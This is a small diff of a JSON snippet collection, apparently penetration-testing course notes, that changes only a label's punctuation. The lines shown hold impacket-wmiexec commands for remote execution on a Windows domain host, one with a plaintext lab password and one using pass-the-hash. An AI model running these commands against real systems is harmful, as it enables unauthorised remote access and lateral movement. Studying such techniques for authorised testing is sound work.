@@ -95,7 +95,7 @@
       "command": "impacket-wmiexec ILF.local/jmarston:'P@ssword!'@10.129.202.85"
     },
     {
-      "label": "Ch23 — wmiexec pass-the-hash with NT hash only (LM part left blank)",
+      "label": "Ch23 - wmiexec pass-the-hash with NT hash only (LM part left blank)",
       "command": "impacket-wmiexec -hashes :<nt_hash> <domain>/<user>@<target_ip>"
     }
   ],
